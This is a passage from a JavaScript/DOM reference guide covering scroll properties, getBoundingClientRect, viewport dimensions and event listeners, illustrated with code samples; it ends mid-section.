- `scrollWidth`: total content width including overflow
- `scrollHeight`: total content height including overflow
- Maximum scroll values derived from these

**clientWidth and clientHeight**

- `clientWidth`: visible width excluding scrollbars
- `clientHeight`: visible height excluding scrollbars
- Used to calculate visible portion and maximum scroll

**offsetLeft and offsetTop**

- These measure element position relative to offsetParent
- Completely different from scroll position
- Not affected by scrolling

### Performance Considerations

**Reading Performance**

- Reading `scrollLeft`/`scrollTop` generally does not force layout recalculation
- Can be read frequently without significant performance impact
- May force layout if element geometry has been modified earlier in the same frame

**Writing Performance**

- Setting these properties is relatively performant
- Does not cause reflow of other elements
- Multiple writes in the same frame may be optimized by browser
- Triggers `scroll` event which may have performance implications if handlers are expensive

**Animation Considerations**

```javascript
// Inefficient: Creates janky animation
function animateScroll(element, target) {
  const start = element.scrollTop;
  const distance = target - start;
  const duration = 500;
  const startTime = performance.now();
  
  function step(currentTime) {
    const elapsed = currentTime - startTime;
    const progress = Math.min(elapsed / duration, 1);
    element.scrollTop = start + distance * progress;
    
    if (progress < 1) {
      requestAnimationFrame(step);
    }
  }
  requestAnimationFrame(step);
}
```

### Scroll Event Interaction

```javascript
element.addEventListener('scroll', (event) => {
  console.log('Scrolled to:', event.target.scrollLeft, event.target.scrollTop);
});

// Programmatic scroll triggers event
element.scrollTop = 100; // Will fire scroll event
```

**Event Characteristics**

- Fires asynchronously after scroll position changes
- Multiple scroll changes may result in single batched event
- Cannot be prevented (not cancelable)
- Bubbles: No
- Composed: No

### Scroll Restoration

**Session History Interaction** Browsers automatically save and restore scroll positions during navigation:

```javascript
// Disable automatic scroll restoration
if ('scrollRestoration' in history) {
  history.scrollRestoration = 'manual';
}

// Save custom scroll position
sessionStorage.setItem('scrollPos', JSON.stringify({
  left: element.scrollLeft,
  top: element.scrollTop
}));

// Restore
const saved = JSON.parse(sessionStorage.getItem('scrollPos'));
if (saved) {
  element.scrollLeft = saved.left;
  element.scrollTop = saved.top;
}
```

### Special Cases and Edge Cases

**Document Scrolling**

```javascript
// HTML element scrolling (standards mode)
document.documentElement.scrollTop = 100;
document.documentElement.scrollLeft = 50;

// Body scrolling (quirks mode or some older browsers)
document.body.scrollTop = 100;

// Cross-browser approach
const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
```

**Elements Without Overflow**

- If element has no scrollable overflow, both properties return `0`
- Setting values on non-scrollable elements has no effect
- `overflow: hidden` prevents user scrolling but allows programmatic scrolling

**Inline Elements**

- Setting scroll properties on inline elements has no effect
- Must have `display: block`, `inline-block`, or other block-level display value

**Transform Effects** Elements with CSS transforms:

- Scroll properties reflect pre-transform coordinates
- Transforms don't affect scroll measurements
- Can create visual disconnect between scroll value and apparent position

### Browser-Specific Quirks

**Fractional Values**

- Modern browsers: support subpixel precision
- Older browsers: may round to integers
- **[Unverified]** Some browsers may round differently when reading vs writing

**Zoom Levels**

- Browser zoom affects pixel measurements
- At 200% zoom, 100px scroll might report as 50px
- **[Inference]** CSS `zoom` property may interact differently across browsers

**Scrollbar Width Calculation**

- `scrollLeft`/`scrollTop` measurements exclude scrollbar width
- Scrollbar width varies by OS and browser
- Can affect maximum scroll calculations

### Alternatives and Modern Approaches

**Element.scroll() / Element.scrollTo()**

```javascript
// Smooth scrolling with modern API
element.scroll({
  top: 100,
  left: 0,
  behavior: 'smooth'
});

// Equivalent to setting scrollTop/scrollLeft
element.scroll(0, 100); // scrollTo(left, top)
```

**Element.scrollBy()**

```javascript
// Relative scrolling
element.scrollBy({
  top: 50,  // Scroll down 50px
  behavior: 'smooth'
});
```

**ScrollToOptions Dictionary** Provides more control than direct property assignment:

- `top`: equivalent to `scrollTop`
- `left`: equivalent to `scrollLeft`
- `behavior`: `'auto'` | `'smooth'` | `'instant'`

### Virtual Scrolling Implications

In virtual scrolling implementations:

```javascript
// Typical virtual scroll tracking
function handleScroll(event) {
  const scrollTop = event.target.scrollTop;
  const itemHeight = 50;
  const visibleStart = Math.floor(scrollTop / itemHeight);
  const visibleEnd = Math.ceil((scrollTop + event.target.clientHeight) / itemHeight);
  
  renderVisibleItems(visibleStart, visibleEnd);
}
```

**[Inference]** Virtual scrolling libraries typically:

- Monitor `scrollTop` for viewport position
- Maintain large phantom height via padding or spacer elements
- Render only visible items plus buffer
- Update `scrollHeight` may cause `scrollTop` adjustment by browser

### Accessibility Considerations

**Programmatic Scrolling**

- Screen readers may not announce programmatic scroll changes
- Focus management should accompany scroll changes
- Use `focus()` on target element after scrolling

```javascript
function scrollToElement(element, container) {
  const targetTop = element.offsetTop - container.offsetTop;
  container.scrollTop = targetTop;
  element.focus({ preventScroll: true }); // Focus without additional scroll
}
```

**Reduced Motion Preference**

```javascript
const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

if (prefersReducedMotion) {
  element.scrollTop = target; // Instant scroll
} else {
  element.scroll({ top: target, behavior: 'smooth' }); // Smooth scroll
}
```

### Debugging Scroll Issues

**Common Problems**

1. **Scroll not happening**: Check if element has `overflow: auto|scroll` and content exceeds dimensions
2. **Unexpected values**: Verify box-sizing, padding, and border calculations
3. **Race conditions**: Ensure element is rendered before setting scroll
4. **RTL confusion**: Test explicitly for RTL scroll behavior

**Diagnostic Snippet**

```javascript
function diagnoseScroll(element) {
  console.log({
    scrollTop: element.scrollTop,
    scrollLeft: element.scrollLeft,
    scrollHeight: element.scrollHeight,
    scrollWidth: element.scrollWidth,
    clientHeight: element.clientHeight,
    clientWidth: element.clientWidth,
    maxScrollTop: element.scrollHeight - element.clientHeight,
    maxScrollLeft: element.scrollWidth - element.clientWidth,
    overflowY: getComputedStyle(element).overflowY,
    overflowX: getComputedStyle(element).overflowX
  });
}
```

---

## getBoundingClientRect

### Return Value Structure

The method returns a `DOMRect` object containing eight properties:

- `x` / `left`: Distance from the viewport's left edge to the element's left edge
- `y` / `top`: Distance from the viewport's top edge to the element's top edge
- `width`: Element's width including padding and borders
- `height`: Element's height including padding and borders
- `right`: Distance from the viewport's left edge to the element's right edge (`left + width`)
- `bottom`: Distance from the viewport's top edge to the element's bottom edge (`top + height`)

Note: `x` and `left` are typically identical, as are `y` and `top`. The distinction exists for historical compatibility reasons.

### Coordinate System and Viewport Reference

All coordinates are relative to the **viewport** (the visible portion of the document), not the document itself. This means:

- Values change when the user scrolls
- Elements above the viewport have negative `top` values
- Elements to the left of the viewport have negative `left` values
- Elements below the visible area have `top` values greater than `window.innerHeight`

To convert to document coordinates:

```javascript
const rect = element.getBoundingClientRect();
const absoluteTop = rect.top + window.scrollY;
const absoluteLeft = rect.left + window.scrollX;
```

### Transform Handling

When CSS transforms are applied, `getBoundingClientRect()` returns the **transformed bounding box**:

```javascript
// Element with transform: rotate(45deg) scale(1.5)
const rect = element.getBoundingClientRect();
// Returns the axis-aligned bounding box of the rotated/scaled element
// width and height represent the transformed dimensions
```

The returned rectangle is always axis-aligned (edges parallel to viewport edges), even if the element is rotated. For a 100×100px square rotated 45°, the bounding rect will be approximately 141×141px.

### Border Box vs Content Box

`getBoundingClientRect()` always returns dimensions based on the **border box**:

```javascript
// CSS: width: 100px; padding: 10px; border: 5px;
const rect = element.getBoundingClientRect();
console.log(rect.width); // 130 (100 + 10*2 + 5*2)
```

This differs from:

- `offsetWidth`/`offsetHeight` (identical to border box)
- `clientWidth`/`clientHeight` (content + padding, excludes borders and scrollbars)
- `element.style.width` (returns the CSS value as a string)

### Fractional Pixels and Subpixel Rendering

All values can be fractional (floating-point numbers):

```javascript
const rect = element.getBoundingClientRect();
console.log(rect.top); // Could be 123.4375
```

Browsers use subpixel positioning for smoother rendering. When precise pixel alignment is needed:

```javascript
const roundedRect = {
  top: Math.round(rect.top),
  left: Math.round(rect.left),
  width: Math.round(rect.width),
  height: Math.round(rect.height)
};
```

### Performance Characteristics

`getBoundingClientRect()` forces a **reflow** (layout recalculation) if the layout is dirty. This happens when:

- DOM has been modified
- Styles have changed
- Layout-affecting properties were accessed

Performance optimization strategies:

```javascript
// Bad: Multiple reflows in a loop
elements.forEach(el => {
  const rect = el.getBoundingClientRect(); // Each call may trigger reflow
  el.style.top = rect.top + 10 + 'px'; // Causes layout invalidation
});

// Good: Batch reads, then batch writes
const rects = elements.map(el => el.getBoundingClientRect()); // Single reflow
rects.forEach((rect, i) => {
  elements[i].style.top = rect.top + 10 + 'px';
});
```

Use `requestAnimationFrame` for animation-related measurements to align with the browser's rendering cycle.

### Visibility and Display States

Behavior with different CSS properties:

- `display: none` - Returns a `DOMRect` with all values set to `0`
- `visibility: hidden` - Returns normal dimensions (element still occupies space)
- `opacity: 0` - Returns normal dimensions
- Zero-sized elements - Returns `width: 0, height: 0`, but position values reflect where the element would be

```javascript
// Hidden element
hiddenEl.style.display = 'none';
const rect = hiddenEl.getBoundingClientRect();
// { x: 0, y: 0, width: 0, height: 0, top: 0, right: 0, bottom: 0, left: 0 }
```

### Inline Elements and Fragmentation

For inline elements that wrap across multiple lines, `getBoundingClientRect()` returns a rectangle that encompasses **all fragments**:

```javascript
// <span> wrapping across 3 lines
const rect = span.getBoundingClientRect();
// Returns a single rectangle covering all three line boxes
// width = widest line, height = sum of all line heights
```

To get individual rectangles for each line fragment:

```javascript
const range = document.createRange();
range.selectNodeContents(inlineElement);
const rects = range.getClientRects(); // Array-like object of DOMRect
```

### Scroll Containers and Overflow

For elements inside scrollable containers:

```javascript
// Element inside a scrolled container
const rect = element.getBoundingClientRect();
// Position is relative to viewport, accounting for container's scroll position
// If element is scrolled out of view within its container, 
// rect may be outside viewport bounds
```

The method accounts for all ancestor scroll positions automatically.

### Iframe Context

When called on elements within an iframe:

```javascript
// Inside iframe
const rect = iframeElement.getBoundingClientRect();
// Coordinates are relative to the iframe's viewport, not the parent window
```

To get coordinates relative to the parent window:

```javascript
const iframeRect = iframe.getBoundingClientRect(); // From parent context
const elementRect = element.getBoundingClientRect(); // From iframe context
const absoluteTop = iframeRect.top + elementRect.top;
```

### Use Cases and Common Patterns

**Intersection Detection:**

```javascript
function isInViewport(element) {
  const rect = element.getBoundingClientRect();
  return (
    rect.top >= 0 &&
    rect.left >= 0 &&
    rect.bottom <= window.innerHeight &&
    rect.right <= window.innerWidth
  );
}
```

**Positioning Elements Relative to Another:**

```javascript
const targetRect = targetElement.getBoundingClientRect();
tooltip.style.position = 'fixed';
tooltip.style.left = targetRect.left + 'px';
tooltip.style.top = (targetRect.bottom + 5) + 'px';
```

**Distance Calculations:**

```javascript
const rect1 = el1.getBoundingClientRect();
const rect2 = el2.getBoundingClientRect();
const horizontalGap = Math.max(0, 
  rect2.left - rect1.right, 
  rect1.left - rect2.right
);
```

### Browser Compatibility Considerations

The method is supported in all modern browsers. Legacy considerations:

- IE8 and below: Lacks `width`/`height` properties (calculate as `right - left` and `bottom - top`)
- IE versions: May have minor inconsistencies with zoom levels
- Very old browsers: `x`/`y` properties were added later (use `left`/`top` instead)

### Comparison with Alternative Methods

**vs `getClientRects()`:**

- `getBoundingClientRect()`: Single rectangle encompassing entire element
- `getClientRects()`: Array of rectangles for each box fragment (useful for inline elements)

**vs `offsetTop`/`offsetLeft`:**

- `getBoundingClientRect()`: Viewport-relative, accounts for transforms
- `offsetTop`/`offsetLeft`: Relative to `offsetParent`, ignores transforms

**vs `scrollIntoView()` coordinates:**

- `getBoundingClientRect()`: Read-only measurement
- `scrollIntoView()`: Action that changes scroll position

### Caching and Invalidation

[Inference] The browser caches layout information, but this cache is invalidated by:

- DOM mutations
- Style changes
- Class/attribute modifications
- Viewport resize
- Scroll events
- Font loading

Accessing `getBoundingClientRect()` after invalidation triggers layout recalculation. Reading the same value multiple times without modifications between calls [Inference] may be served from cache in some browsers.

---

## Viewport Dimensions

### Conceptual Framework

Viewport dimensions represent the visible rectangular area of a web document, measured in CSS pixels. The viewport serves as the rendering context boundary, distinct from document dimensions, window dimensions, and screen dimensions. The viewport's coordinate system originates at the top-left corner (0,0) and extends to (width, height).

### Viewport Types and Contexts

#### Visual Viewport vs Layout Viewport

The **layout viewport** represents the containing block for fixed-position elements and determines initial containing block dimensions. The **visual viewport** represents the currently visible portion of the layout viewport, accounting for pinch-zoom, on-screen keyboards, and browser UI elements.

```javascript
// Visual viewport dimensions (actual visible area)
window.visualViewport.width
window.visualViewport.height

// Layout viewport dimensions (reference frame)
document.documentElement.clientWidth
document.documentElement.clientHeight
```

The distinction becomes critical on mobile devices where pinch-zoom or virtual keyboards modify the visual viewport while the layout viewport remains constant. The visual viewport can be smaller than or equal to the layout viewport, never larger.

#### Initial Containing Block

The initial containing block (ICB) dimensions derive from the layout viewport. For continuous media, the ICB dimensions equal the viewport dimensions. Absolutely positioned elements with fixed ancestors reference the layout viewport, while those without reference the ICB.

### Measurement APIs

#### Legacy Window Properties

```javascript
window.innerWidth  // Viewport width including scrollbars
window.innerHeight // Viewport height including scrollbars

window.outerWidth  // Browser window width
window.outerHeight // Browser window height
```

The `innerWidth` and `innerHeight` include scrollbar dimensions when present. On desktop browsers, classic scrollbars typically consume 15-17px. Overlay scrollbars (macOS, mobile) don't affect these measurements.

#### Document Element Client Dimensions

```javascript
document.documentElement.clientWidth  // Viewport width excluding scrollbars
document.documentElement.clientHeight // Viewport height excluding scrollbars
```

These properties provide the most reliable cross-browser viewport measurements, excluding scrollbar width. They represent the actual rendering area available for content.

#### Visual Viewport API

```javascript
const vv = window.visualViewport;

vv.width          // Visual viewport width in CSS pixels
vv.height         // Visual viewport height in CSS pixels
vv.offsetLeft     // Horizontal offset from layout viewport
vv.offsetTop      // Vertical offset from layout viewport
vv.pageLeft       // X coordinate relative to document
vv.pageTop        // Y coordinate relative to document
vv.scale          // Pinch-zoom scale factor (1.0 = 100%)
```

The Visual Viewport API provides precise measurements accounting for browser UI changes, virtual keyboards, and zoom. The `resize` and `scroll` events on `visualViewport` fire when these properties change.

### Viewport Meta Tag Configuration

#### Basic Syntax

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

The viewport meta tag controls layout viewport dimensions and zoom behavior on mobile browsers. Without this tag, mobile browsers use a default viewport width (typically 980px) and scale down content.

#### Configuration Properties

**width**: Sets layout viewport width in pixels or `device-width` **height**: Sets layout viewport height in pixels or `device-height` **initial-scale**: Initial zoom level (1.0 = 100%) **minimum-scale**: Minimum allowed zoom level **maximum-scale**: Maximum allowed zoom level **user-scalable**: Enables/disables pinch-zoom (`yes`/`no`) **interactive-widget**: Behavior for virtual keyboards (`resizes-visual`, `resizes-content`, `overlays-content`)

```html
<!-- Responsive design standard -->
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">

<!-- Disable zoom (accessibility concern) -->
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<!-- Fixed width -->
<meta name="viewport" content="width=1024">
```

#### Interactive Widget Modes

The `interactive-widget` property controls virtual keyboard behavior:

- **resizes-visual** (default): Keyboard reduces visual viewport, layout viewport unchanged
- **resizes-content**: Keyboard reduces both viewports, triggering reflow
- **overlays-content**: Keyboard overlays content, viewports unchanged

### Viewport Units in CSS

#### Standard Viewport Units

**vw**: 1% of viewport width (layout viewport) **vh**: 1% of viewport height (layout viewport) **vmin**: 1% of smaller viewport dimension **vmax**: 1% of larger viewport dimension

```css
.full-screen {
  width: 100vw;
  height: 100vh;
}

.square {
  width: 50vmin;
  height: 50vmin;
}
```

**[Inference]** Viewport units reference the layout viewport in most contexts, but this behavior varies during zoom operations on some mobile browsers.

#### Small, Large, and Dynamic Viewport Units

Modern CSS introduces viewport unit variants addressing mobile browser UI concerns:

**svw, svh**: Small viewport (UI showing) **lvw, lvh**: Large viewport (UI hidden) **dvw, dvh**: Dynamic viewport (current state)

```css
.mobile-header {
  height: 10svh; /* Always visible, accounts for browser chrome */
}

.hero-section {
  height: 100dvh; /* Adapts as browser UI shows/hides */
}
```

Small viewport units use the smallest possible viewport dimensions (maximum browser UI), large units use the largest (minimum browser UI), and dynamic units reflect the current state.

#### Container Query Length Units

When using container queries, viewport units reference the query container rather than the viewport:

**cqw**: 1% of container width **cqh**: 1% of container height **cqi**: 1% of container inline size **cqb**: 1% of container block size **cqmin**: 1% of smaller container dimension **cqmax**: 1% of larger container dimension

### Device Pixel Ratio and Physical Pixels

The device pixel ratio (DPR) relates CSS pixels to physical device pixels:

```javascript
window.devicePixelRatio // Returns 1, 1.5, 2, 3, etc.
```

A viewport measuring 375×667 CSS pixels on a device with DPR 2.0 corresponds to 750×1334 physical pixels. High-DPI displays (Retina, HiDPI) typically have DPR values of 2 or 3.

Physical viewport dimensions:

```javascript
const physicalWidth = window.innerWidth * window.devicePixelRatio;
const physicalHeight = window.innerHeight * window.devicePixelRatio;
```

### Orientation and Dimension Changes

#### Orientation Detection

```javascript
// Screen Orientation API
screen.orientation.type // "portrait-primary", "landscape-primary", etc.
screen.orientation.angle // 0, 90, 180, 270

// Legacy approach
const isPortrait = window.innerHeight > window.innerWidth;
const isLandscape = window.innerWidth > window.innerHeight;

// Media query
const mediaQuery = window.matchMedia("(orientation: portrait)");
```

#### Handling Resize Events

```javascript
// Layout viewport resize
window.addEventListener('resize', () => {
  const width = document.documentElement.clientWidth;
  const height = document.documentElement.clientHeight;
  // Handle dimension changes
});

// Visual viewport changes (zoom, keyboard)
window.visualViewport.addEventListener('resize', () => {
  const scale = window.visualViewport.scale;
  const height = window.visualViewport.height;
  // Handle visual changes
});
```

**[Inference]** Debouncing resize handlers is typically necessary for performance, as resize events can fire hundreds of times during a single user interaction.

### Safe Area Insets

Modern devices with notches, rounded corners, or home indicators require safe area consideration:

```css
.safe-content {
  padding-top: env(safe-area-inset-top);
  padding-right: env(safe-area-inset-right);
  padding-bottom: env(safe-area-inset-bottom);
  padding-left: env(safe-area-inset-left);
}

/* Combined with max() for minimum padding */
.header {
  padding: max(20px, env(safe-area-inset-top)) 20px 20px;
}
```

The `viewport-fit=cover` meta tag value enables safe area inset behavior:

```html
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
```

### Cross-Browser Viewport Measurement Function

```javascript
function getViewportDimensions() {
  return {
    // Layout viewport (most reliable)
    layoutWidth: document.documentElement.clientWidth,
    layoutHeight: document.documentElement.clientHeight,
    
    // Visual viewport (if supported)
    visualWidth: window.visualViewport?.width ?? document.documentElement.clientWidth,
    visualHeight: window.visualViewport?.height ?? document.documentElement.clientHeight,
    
    // Including scrollbars
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    
    // Zoom/scale
    scale: window.visualViewport?.scale ?? 1,
    
    // Device pixel ratio
    dpr: window.devicePixelRatio,
    
    // Orientation
    orientation: window.innerWidth > window.innerHeight ? 'landscape' : 'portrait'
  };
}
```

### Viewport-Relative Positioning Strategies

#### Fixed Positioning Relative to Viewport

```css
.fixed-header {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  /* Fixed to layout viewport */
}
```

Fixed elements position relative to the layout viewport, remaining stationary during scroll. During pinch-zoom, fixed elements scale with the layout viewport, not the visual viewport.

#### Sticky Positioning Constraints

```css
.sticky-nav {
  position: sticky;
  top: 0;
  /* Sticks within scrolling ancestor */
}
```

Sticky positioning combines relative and fixed behaviors, constrained by the nearest scrolling ancestor. The element flows normally until reaching the specified threshold, then "sticks" until the container scrolls out of view.

### Viewport Considerations for Responsive Design

#### Breakpoint Strategy

Common viewport width breakpoints:

- **320px**: Small mobile devices
- **375px**: Standard mobile (iPhone SE, modern small phones)
- **768px**: Tablets (portrait)
- **1024px**: Tablets (landscape), small desktops
- **1280px**: Desktop displays
- **1920px**: Full HD displays

```css
/* Mobile-first approach */
.container {
  padding: 1rem;
}

@media (min-width: 768px) {
  .container {
    padding: 2rem;
  }
}

@media (min-width: 1280px) {
  .container {
    padding: 3rem;
    max-width: 1200px;
    margin: 0 auto;
  }
}
```

#### Fluid Typography with Viewport Units

```css
.heading {
  /* Minimum 1.5rem, scales with viewport, maximum 3rem */
  font-size: clamp(1.5rem, 4vw, 3rem);
}

.body-text {
  /* Scales between 16px and 20px */
  font-size: clamp(1rem, 0.875rem + 0.5vw, 1.25rem);
}
```

### Performance Implications

#### Reflow Triggers

Viewport dimension queries trigger layout reflow when accessed:

```javascript
// Forces reflow (read)
const width = element.offsetWidth;
const height = document.documentElement.clientHeight;

// Batch reads before writes to minimize reflows
const dims = getViewportDimensions(); // Single reflow
element.style.width = dims.layoutWidth + 'px'; // Layout operation
```

**[Inference]** Reading viewport or layout properties after making DOM changes typically forces synchronous layout calculation, which can degrade performance in tight loops.

#### Viewport Change Throttling

```javascript
let resizeTimeout;
window.addEventListener('resize', () => {
  clearTimeout(resizeTimeout);
  resizeTimeout = setTimeout(() => {
    // Execute expensive operations
    recalculateLayout();
  }, 150);
});

// Or using requestAnimationFrame
let rafPending = false;
window.addEventListener('resize', () => {
  if (!rafPending) {
    rafPending = true;
    requestAnimationFrame(() => {
      handleResize();
      rafPending = false;
    });
  }
});
```

### Edge Cases and Browser Quirks

#### iOS Safari Viewport Behavior

iOS Safari's address bar appears and disappears during scroll, changing `window.innerHeight`. This causes `100vh` to either include or exclude the browser chrome depending on scroll state:

```css
/* Problem: 100vh jumps during scroll on iOS */
.fullscreen-problem {
  height: 100vh;
}

/* Solution: Use fixed height or dvh units */
.fullscreen-fixed {
  height: 100dvh; /* Dynamic viewport height */
}

/* Or JavaScript approach */
.fullscreen-js {
  height: var(--viewport-height);
}
```

```javascript
// Set custom property for reliable height
function setViewportHeight() {
  document.documentElement.style.setProperty(
    '--viewport-height',
    `${window.innerHeight}px`
  );
}
setViewportHeight();
window.addEventListener('resize', setViewportHeight);
```

#### Virtual Keyboard Interference

Virtual keyboards modify the visual viewport but not always the layout viewport:

```javascript
// Detect keyboard visibility
const originalHeight = window.visualViewport.height;

window.visualViewport.addEventListener('resize', () => {
  const currentHeight = window.visualViewport.height;
  const keyboardHeight = originalHeight - currentHeight;
  
  if (keyboardHeight > 100) { // Keyboard likely visible
    // Adjust fixed elements or scroll into view
  }
});
```

#### Desktop Zoom Behavior

Desktop browser zoom modifies the effective viewport dimensions:

```javascript
// Browser zoom at 200% halves the logical viewport width
// 1920px physical width → 960px logical width at 200% zoom
const zoomLevel = window.devicePixelRatio;
```

**[Unverified]** The relationship between browser zoom and devicePixelRatio varies across browsers and may not reliably indicate zoom level on all platforms.

### Viewport Dimensions in Different Contexts

#### iframes

Iframes have independent viewport contexts:

```javascript
// Parent viewport
const parentWidth = window.innerWidth;

// Iframe viewport (from within iframe)
const iframeWidth = window.innerWidth;

// Iframe dimensions from parent
const iframe = document.querySelector('iframe');
const iframeRect = iframe.getBoundingClientRect();
```

#### Shadow DOM

Shadow DOM elements share the document's viewport context but maintain encapsulated styles:

```javascript
// Viewport units in shadow DOM reference the main viewport
const shadow = element.attachShadow({mode: 'open'});
shadow.innerHTML = `
  <style>
    :host {
      width: 100vw; /* References main viewport */
    }
  </style>
`;
```

### Testing Viewport Dimensions

#### Browser DevTools Emulation

Chrome DevTools device emulation modifies `window.innerWidth/Height`, `devicePixelRatio`, and user agent. Visual Viewport API values reflect the emulated device.

#### Programmatic Viewport Testing

```javascript
// Create test fixture
function testViewportUnit(unit) {
  const div = document.createElement('div');
  div.style.width = `100${unit}`;
  document.body.appendChild(div);
  const width = div.offsetWidth;
  document.body.removeChild(div);
  return width;
}

const vwWidth = testViewportUnit('vw');
const dvwWidth = testViewportUnit('dvw');
```

### Future Viewport Specifications

The CSS Working Group continues developing viewport-related specifications:

- **Container queries**: Viewport queries based on ancestor containers rather than root viewport
- **Scroll-driven animations**: Animations tied to viewport scroll position
- **View transitions**: Coordinated animations across viewport state changes

**[Unverified]** Future specifications may introduce additional viewport measurement modes or context-specific viewport references, but specific proposals are subject to change.

---

# Event Handling

## Event Listeners in JavaScript

### Core Mechanics

`addEventListener()` and `removeEventListener()` manage event handling through the DOM's event system. They attach and detach event handlers to DOM nodes, allowing multiple handlers per event type on a single element.

**Syntax:**

```javascript
target.addEventListener(type, listener, options)
target.removeEventListener(type, listener, options)
```

### Parameters Deep Dive

#### type (string)

Case-sensitive event type string. Common types include `"click"`, `"mouseenter"`, `"keydown"`, `"load"`, `"DOMContentLoaded"`. Custom events use arbitrary strings.

#### listener (function | object)

The callback invoked when the event fires. Can be:

- Function reference
- Object with `handleEvent()` method

**Function signature:**

```javascript
function(event) {
  // event is the Event object
}
```

#### options (object | boolean)

**As boolean (legacy):** `useCapture` - if `true`, uses capture phase; if `false`, uses bubble phase (default).

**As object:**

- `capture` (boolean): Use capture phase. Default: `false`
- `once` (boolean): Remove listener automatically after first invocation. Default: `false`
- `passive` (boolean): Listener will never call `preventDefault()`. Improves scroll performance. Default: `false` (except for `touchstart`, `touchmove`, `wheel`, `mousewheel` where browsers may default to `true`)
- `signal` (AbortSignal): Allows removal via AbortController

### Event Phases

Events propagate through three phases:

1. **Capture phase**: From `window` down to target's parent
2. **Target phase**: On the target element itself
3. **Bubble phase**: From target's parent back up to `window`

Listeners with `capture: true` fire during capture phase. Others fire during target and bubble phases.

```javascript
parent.addEventListener('click', handler, { capture: true }); // Fires first
child.addEventListener('click', handler); // Fires second
parent.addEventListener('click', handler); // Fires third
```

### Listener Identity and Removal

`removeEventListener()` requires **exact** reference matching:

**Critical matching requirements:**

- Same `type` string
- Same function reference (not just identical code)
- Same `capture` value

```javascript
// ✗ This fails - different function references
element.addEventListener('click', () => console.log('hi'));
element.removeEventListener('click', () => console.log('hi'));

// ✓ This works - same reference
const handler = () => console.log('hi');
element.addEventListener('click', handler);
element.removeEventListener('click', handler);
```

**Anonymous functions cannot be removed** without storing the reference.

### Options Object Behavior

#### once

```javascript
button.addEventListener('click', handler, { once: true });
// handler automatically removed after first click
```

Equivalent to:

```javascript
function handlerOnce(event) {
  handler(event);
  button.removeEventListener('click', handlerOnce);
}
button.addEventListener('click', handlerOnce);
```

#### passive

```javascript
element.addEventListener('touchstart', handler, { passive: true });
// Cannot call event.preventDefault() - throws error in strict mode
```

Benefits:

- Browser can optimize scrolling by not waiting for handler completion
- Particularly important for touch/wheel events on mobile
- Scroll jank reduction

**[Inference]** Passive listeners signal to the browser that scroll-blocking operations won't occur, allowing the browser to immediately process the scroll.

#### signal

```javascript
const controller = new AbortController();

element.addEventListener('click', handler, { 
  signal: controller.signal 
});

// Remove listener via abort
controller.abort();
```

Advantages over manual removal:

- Remove multiple listeners simultaneously
- Tie listener lifetime to async operations
- Cleaner cleanup in complex scenarios

### Multiple Listeners

Multiple listeners on the same element/type execute in **registration order**:

```javascript
element.addEventListener('click', () => console.log('First'));
element.addEventListener('click', () => console.log('Second'));
element.addEventListener('click', () => console.log('Third'));
// Click order: First, Second, Third
```

**Duplicate registration prevention:** Adding the exact same listener (same function reference, same options) multiple times only registers it once.

```javascript
element.addEventListener('click', handler);
element.addEventListener('click', handler); // Ignored - already registered
```

### Event Object

The listener receives an Event object (or subclass) with properties:

**Universal properties:**

- `type`: Event type string
- `target`: Element that triggered the event
- `currentTarget`: Element with the listener attached
- `eventPhase`: 1 (capture), 2 (target), 3 (bubble)
- `bubbles`: Whether event bubbles
- `cancelable`: Whether `preventDefault()` works
- `defaultPrevented`: Whether `preventDefault()` was called
- `timeStamp`: High-resolution timestamp

**Methods:**

- `preventDefault()`: Cancel default browser action
- `stopPropagation()`: Stop bubbling/capturing to other elements
- `stopImmediatePropagation()`: Stop other listeners on same element

**Event-specific subclasses** add properties:

- `MouseEvent`: `clientX`, `clientY`, `button`, `buttons`, `altKey`, etc.
- `KeyboardEvent`: `key`, `code`, `keyCode`, `altKey`, `ctrlKey`, etc.
- `TouchEvent`: `touches`, `targetTouches`, `changedTouches`
- `WheelEvent`: `deltaX`, `deltaY`, `deltaZ`, `deltaMode`

### this Binding

Inside non-arrow function listeners, `this` refers to `currentTarget`:

```javascript
element.addEventListener('click', function(event) {
  console.log(this === element); // true
  console.log(this === event.currentTarget); // true
});
```

**Arrow functions don't bind `this`** - they inherit from surrounding scope:

```javascript
const obj = {
  name: 'MyObject',
  init() {
    element.addEventListener('click', (event) => {
      console.log(this === obj); // true
      console.log(this === element); // false
    });
  }
};
```

### handleEvent Interface

Objects with `handleEvent()` method can serve as listeners:

```javascript
const listener = {
  handleEvent(event) {
    if (event.type === 'click') this.handleClick(event);
    if (event.type === 'mouseover') this.handleMouseOver(event);
  },
  handleClick(event) { /* ... */ },
  handleMouseOver(event) { /* ... */ }
};

element.addEventListener('click', listener);
element.addEventListener('mouseover', listener);
```

`this` inside `handleEvent()` refers to the listener object, not the element.

### Memory Management and Leaks

**Common leak patterns:**

1. **Unreachable elements with listeners:**

```javascript
let element = document.getElementById('temp');
element.addEventListener('click', handler);
element.remove(); // Element removed from DOM
element = null; // Element reference cleared
// Listener still exists in memory if handler closes over variables
```

2. **Closure capturing:**

```javascript
function attachListener() {
  const largeData = new Array(1000000);
  button.addEventListener('click', () => {
    console.log(largeData.length); // Captures largeData
  });
}
```

**Prevention strategies:**

- Remove listeners before removing elements
- Use `once: true` for one-time handlers
- Use AbortSignal for lifecycle management
- Avoid capturing large objects in closures
- Use WeakMap for element-associated data

### Delegation Pattern

Rather than attaching listeners to many elements, attach one to a common ancestor:

```javascript
// Instead of this:
items.forEach(item => {
  item.addEventListener('click', handleClick);
});

// Do this:
container.addEventListener('click', (event) => {
  if (event.target.matches('.item')) {
    handleClick(event);
  }
});
```

**Benefits:**

- Fewer listeners in memory
- Handles dynamically added elements
- Better performance for large lists

**Caveats:**

- Event must bubble
- Need to check `event.target` identity
- May need `event.target.closest('.selector')` for nested elements

### Performance Considerations

**Passive listeners for scroll performance:**

```javascript
// Non-passive blocks scroll until handler completes
element.addEventListener('wheel', handler); // ✗ Can cause jank

// Passive allows immediate scrolling
element.addEventListener('wheel', handler, { passive: true }); // ✓
```

**Debouncing and throttling:** For high-frequency events (`scroll`, `resize`, `mousemove`):

```javascript
